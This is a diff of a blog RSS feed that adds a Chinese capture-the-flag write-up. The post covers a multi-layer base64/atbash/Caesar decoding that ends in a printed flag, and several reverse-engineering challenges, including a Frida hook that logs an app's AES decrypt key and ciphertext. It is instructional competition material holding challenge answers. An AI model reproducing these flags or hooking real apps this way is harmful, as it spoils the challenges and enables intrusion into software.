4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxYYTJSdlZHeGFWVkpVUWxkV1JWcDJXV3BLUjJNeFRuTmhSbHBwVmpKb1dGZFhlRzlVYlZaSFYxaGtXR0pJUW5KVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkhWa2xVYXpsVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKdGVHRldiRnAzWkd4YWNWTnJaR3BoZWxaWVZrY3hSMVV4U2xkalJGcFhZbGhDU0ZkV1dtdFhSa3B5V2tkb1UyRjZWbmRXVnpBeFVXc3hjMWRZYUZoaVIxSmhWbXBDVjA1R1dsaE9WVGxZVW0xU1NWcFZZelZXYlVWNFYycE9WMDFHY0ZSV2FrWnJaRlp3U0dGR1RtbFNiWFExVm14amVFMUZNVWhTYmtwT1ZtMVNWVmxYZEdGWFJscHhWRzA1VmxKdGVGaFdNblIzWWtaS2NrNVVSbGhoTVhCeVdWWmFhMUl4VG5OaVJtUnBWa1ZKTUZac1kzaFdNVWw0WTBWc1YySkZOWEJWYkdoRFpERmFkR1ZIUm10TmJFcDZWakowYTFsV1RrbFJhemxYWVd0YWFGcFhlRnBsUjBaSlZHeFdUbFp1UWpWV1IzaHFUbFphVjFkdVRsaGhhelZXVm14YWQyRkdXWGRXVkVaWFlrWktlbGRyVlRGaFJUQjNVMnQwVjAxV2NGaFdha1pXWlVaa2MyRkdVbWhOYkVwNFZsZHdTMkl4V1hoVmJGcGhVbXMxV1ZWdGVGZE5NVmw1WkVSQ2FFMVZiRE5VYkZaclZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZaRlZYZFdiVEUwVmpKU1JrNVdhR3RTYkZwdldsZDBZVmRXWkZoa1JrNVZUVlpzTTFSV2FFZFdNa1Y2WVVkR1dsWkZXak5XUlZwM1VteGtjMXBIZEZkTlNFSktWbGN4TkZReFdYZE5WbHBZVjBoQ1dGbHNhRzlXUmxZMlVtdDBhMUpzY0RGV1IzaFBZVmRGZUdOR2NGaFdNMUp5VmxSS1QxSXhXblZTYkU1b1RWaENlVlpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVlc4eVZtMTRRMWRHV25OalJYUmhWbTFTU0ZWdGN6VldNVnB6V2tVMVRtSlhhRTlXYlRGM1VqRnNXRkpZYUdGU1YyaFlXVlJLYjFWV1duUmtTR1JWVFZad01GcEZhR3RXUmxwelkwaHdXRmRJUWtoV2ExVjRWMFpXY21KR1drNWliRXB2VjFaa05GUXhTbkpPVm1Sb1VtNUNjRlZxU205V1ZscEhWV3RrYTAxV2JEUlhhMmhUWVRGSmVsRnVRbFpoYTFwTVZHMTRZV05zY0VWVmJXeE9WbXhaTVZaWGVHOWpNa1Y1Vm01S1dHSkhlRmhaYkdodllVWnNWbGR1WkZOV2EzQXdXa1ZhVDFSc1dYaFRhbEpYWVd0dk1GVjZSbXRTTVU1WllrZG9VMkpYYUZsWFYzaHZWVEZrUjFwR1pHRlNWR3h4VkZaYWQwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcDBWVmhrV0Zac2NFdGFWVnBYVjFkR1IyRkhiRmhTYTNBeVZteGtkMUl4YkZoV2JrNVlWMGQ0YzFWc1pGTlhSbEpZWkVaa1QxSnRkRE5YYTJNMVYwWktjMk5FUWxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVVsNVVtdGtWV0Y2Vms5WmJHUnFaVVphZEUxVVVtaE5iRVkwVld4b2IyRldTblJoUmxwYVZrVndWRll3V25Oa1IxWkdaRWR3VGxac1dYcFdNblJoVkRKR2NrMVdhR3hUUjNoWVZGYzFiMk5zV2tWU2JVWnJWbXRhZWxkclduZFdNVmw0VW1wT1YyRnJTbWhWTWpGU1pWWlNjbGR0YUZOaWEwcFFWbGN3TVZFd01YTlhia1pVWW01Q2MxVnRjekZUVmxaMFpFZEdhVkpyY0RCV1Z6QTFWMnhhUms1VlVsWk5WbkJ5Vm14YVQyTldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZsUmEzQllZVEZ3VUZaSGVHRmtSMUkyVW14a2FFMVlRakpYV0hCSFZtMVdWMU5zYkdsU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGbFVUbXRYUjBwSFkwaEtWVlpzY0ROYVZscDNVbXhhVlZKdGFGZGhNMEY0Vmxaa2QxVXhXWGhYYTFwcVVrVTFWMVpyVm1GaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnNjRmRpUjA0eldsVmtTbVZXV25WVWJHaHBZWHBXV2xkWGVHOVZNVnBYVm01R1UySlZXbFZWYlhoelRsWndWbUZIZEZkTlJFWlhXVEJhYjFkdFJuSk9WRTVYVFVad1lWcFhlRWRqYlVaSFdrZG9hRTB3U2xKV2JURjNVakZaZVZWc1pGVmlhelZZV1d4a05GWkdVbGRXYm1SWFlrWnNORmRyVWxOaFZURnlZa1JPVldKR2NISldNR1JMWXpGT2NrOVdXbWhOVm5CdlYxZHdSMVV4V1hoYVNGWlZZWHBzVkZsclpETk5WbHBJWlVaYVQxWXdXa2xWTW5SaFlXeEtXRlZzWkZWV00wSklXa2Q0WVdSRk1WWmtSbEpUWWtad05sWnNaRFJaVmxKelUyNVdVbUpYYUZsWmExcDNZMnhhY1ZKck9WTk5WVFV4VmxjeE1GVXlSalpXYm1SWFZucEJlRlZYYzNoV01XUlpZVVpvYVZJeFNtaFdiWEJEVmpBMVIxZHNhRTlXYXpWWFZGZDBkMlZXVW5OWGJrNVlZbFZXTkZrd1pHOVdNREZIWTBod1YySkdjRkJaZWtaUFkyczFWMVJ0YkZOaVdGRXhWbTE0YW1WRk1VWk5WV2hUWW10d1QxWnRNVFJWTVd4VlZHdE9XRkp0ZUhwWlZXTTFWakZLZEdWR2FGZE5ibEYzV1ZkemVHTnJOVlpoUm5Cb1RWaENNbFp0Y0VKa01sWkhWRzVHVkdKSFVsaFphMVozVWtaYVIxZHRkRlZpVmxwSVdUQldjMVpIU2xoaFJsSlZWa1Z3ZGxac1dtRlNNVnAwVW0xMFRtRXhjRWxXYWtreFZURlNjMVJyYUdoU2JWSldWbTE0WVdWc1VuSlhiVVpZVWxSV1YxUXhXbTlWTURGSlVXeG9WMkZyYnpCWlZFWmhaRVpPYzJKSGFGTlNWRlpYVm0xNFlXUXlSa2RYV0dSWFZrVmFXRmxyV2t0bGJHUnlWbFJHYUZKVVFqTlZNblF3VmpBeFYyTkdhRmRoYTFwWFdsVmFhMk15UmtkVmJXaE9Za1Z3TkZac1pIZFRNa2w0VjFob1ZtSkdjR2hWYlhNeFYxWldkR1ZHWkU1TlZtdzFXa1ZTUTJGRk1WWmlSRTVWWWtaYWNsWnNaRXRTTWs1SlUyeGtVMDB5YUc5V2FrSnJWVzFXZEZSclpHRlNNbmhaVldwS2IxWnNXbk5oU0dSU1lsWmFTRlpIZEd0V1YwcElaVWhDVm1KWVRYaFpha1pUVjBkV1JtUkdaR2xTTVVwYVZrWmFiMlF4VW5OWGJrNXFVbTFvWVZsVVNtOVZSbHB4VTJ0MFYySkhVbnBaVlZwM1lVVXhXVkZZY0ZkU2JGcG9Xa1JHWVdSR1NuSmhSM1JUWWtad2RsZHNaREJaVm1SeldraE9WMkpWV205VVZscHpUVEZTVjJGRlpGZE5hM0I1V1RCYWIxWXlSWGhYYWs1WFVsWndWMXBWV210amJIQklZMGRzVkZKVmNFcFdiVEI0WldzeFYxZFliRlJoTWxKWVdWZDRTMWRHVWxkWGJtUm9VbTFTV0ZZeWN6RmlSa3AxVVd0b1dHRXhjRkJaVm1SR1pVZE9SMk5HYUZkTk1VcDVWMWR3UjJFeFNYbFRhMnhVWWtkb2NGbHNXa3RsYkZwMFRVaG9WazFYVW5wWlZFNXJWakpLV1ZWc2FGVldNMUl6VmpCYVYyUkhUa1pQVm1SWFlraENObGRVUW05VE1WbDNUVlZvVm1FemFGaFVWV1JUVjBaVmVGZHNUbXBOYXpWSVYydGFUMVl5U2xWaGVrcFhZbFJHTTFWcVJuTlhSa3BaWVVkR1UxWXlhRmxYVmxKTFlqRldWMWR1VW10VFIxSldWRlphZDAxR2NFWmhSM1JYVW14d2Vsa3dhSGRYUjBWNFUyeFNWMDF1YUdoYVJXUlhVakpHUjFkck5XbGlWMmcxVmpGYWEwNUdVWGhUYmtwUFZtMVNhRlZ0TlVOalJsWjBaRWhrVkZac2NEQmFSV1JIVjBkS1YxZHNiRmRpV0ZKNlZteGtTMWRXUm5WUmJGcG9ZVEZ3VFZaSE1UUlpWMDV6WVROd2FGSXllRTlXYlhoYVRVWmFjVk5xUWxwV2JWSkpWVzAxVDJGc1NuUmhSbWhhVmtWYWFGcFdXbmRXYkdSMVZHMXdWMkV6UWpaWFZFSnJUa1pWZVZOc1pGUmlWVnBaVm10V1MyTnNiSEZTYkZwclRVUkdXbFpYTVc5Vk1sWjBaVVpzVjJKWVFsQldWRVpyVWpGd1IxcEdhR2xoZWxaWlZrWmtlazFXVGtkWFdHeHNVbnBzYjFadE1WTlRSbFY1VGxoT1YwMXJjRlpWYkZKRFYwWmFjMVpxVWxaaGEzQlFWV3BHYTJNeVJraGhSM2hwVjBkb2FGWnRlR3BsUlRGSVZWaHNWMkpIVW05VVZFcFRWMVpzZEUxV1RsaFNiRXBaV2tWYWExUXhTblJrUkU1WVlUSk5NVll3V2t0ak1rNUpZMFp3VGxJeVozcFdiWEJMVWpKT2MxcElUbFppU0VKUFdXMHhibVZzV2xoalJXUnJUVlUxU1ZVeWRHOWhSa2w2WVVoQ1ZtSlVWa1JYVmxwaFpFZE9SbHBIYUdsV2JIQktWbTB3TVZNeFVuTlhibEpXWWtkNFdGUlZaRk5rYkZsNFYyNU9hMUl4V2tkYVJXUjNWR3hhYzJORVVsZFdiVTQwVldwR2ExSXhUblZWYlhoVVVqTm9XVlpHWXpGVmJWRjRWMjVHVWxkSGFGaFVWM014VTBac2NsZHNaR2hXYTNCNldXdFNUMVl5U2xWU1ZFSllWbTFTVDFwVlduZFRWbEp6WVVkc1UySklRbHBXYlRCNFRVZFJkMDVXWkZoaVJuQlpXVlJHZDFWV1duUmtSWFJXVFZaYVNGWldhR3RWVmxaVlRVUnJQUT09
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;解 base64&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/13.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;atbash_cipher 和 string_reverserever&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Bash&#34;&gt;ntio&amp;#123;lmi8i56k1lkn73im7ni75k52in41jj70&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Caesar 8&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Bash&#34;&gt;flag&amp;#123;dea8a56c1dcf73ae7fa75c52af41bb70&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;reverse&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#reverse&#34;&gt;#&lt;/a&gt; Reverse&lt;/h2&gt;
+&lt;h3 id=&#34;babyre&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#babyre&#34;&gt;#&lt;/a&gt; BabyRe&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/14.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;赛博厨子嗦哈&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/15.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;tea&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tea&#34;&gt;#&lt;/a&gt; TEA&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/16.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;不知道啥情况，打开就是 flag，试了，还真是&lt;/p&gt;
+&lt;h3 id=&#34;easyre&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#easyre&#34;&gt;#&lt;/a&gt; EasyRe&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/17.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;自带解密函数&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;Java.perform(function () &amp;#123;
+
+   var aESUtils =Java.use(&amp;quot;com.example.easyre.AESUtils&amp;quot;);
+    aESUtils.decrypt.implementation=function (a,b)&amp;#123;
+
+
+       console.log(&amp;quot;miwen:&amp;quot;,a);
+       console.log(&amp;quot;key&amp;quot;, b);
+
+       var srcret = this.decrypt(a,b);
+       console.log(&amp;quot;加密后:&amp;quot;,srcret);
+       return srcret;
+&amp;#125;
+
+&amp;#125;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;hook 出来然后直接看密文&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/18.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;base64 解密&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/19.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;gorc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gorc&#34;&gt;#&lt;/a&gt; GORC&lt;/h3&gt;
+&lt;p&gt;动调出 key&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/20.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接解密&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/21.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2023/10/24/FSCTF-wp/</guid>
             <title>FSCTF_wp</title>
@@ -2237,8 +2463,8 @@ i 显示汇编指令。
             <guid isPermalink="true">http://example.com/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/</guid>
             <title>国赛复现</title>
             <link>http://example.com/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/</link>
-            <category>pie</category>
             <category>got改写</category>
+            <category>pie</category>
             <category>随机数检查</category>
             <pubDate>Thu, 03 Aug 2023 17:17:58 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;国赛题复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#国赛题复现&#34;&gt;#&lt;/a&gt; 国赛题复现&lt;/h1&gt;
@@ -2305,8 +2531,8 @@ i 显示汇编指令。
             <guid isPermalink="true">http://example.com/2023/08/02/find-flag/</guid>
             <title>find_flag</title>
             <link>http://example.com/2023/08/02/find-flag/</link>
-            <category>pie</category>
             <category>canary</category>
+            <category>pie</category>
             <category>格式化字符串漏洞</category>
             <pubDate>Wed, 02 Aug 2023 18:44:10 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;题目复现深育杯-2021find_flag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目复现深育杯-2021find_flag&#34;&gt;#&lt;/a&gt; 题目复现 ——[深育杯 2021] find_flag&lt;/h1&gt;
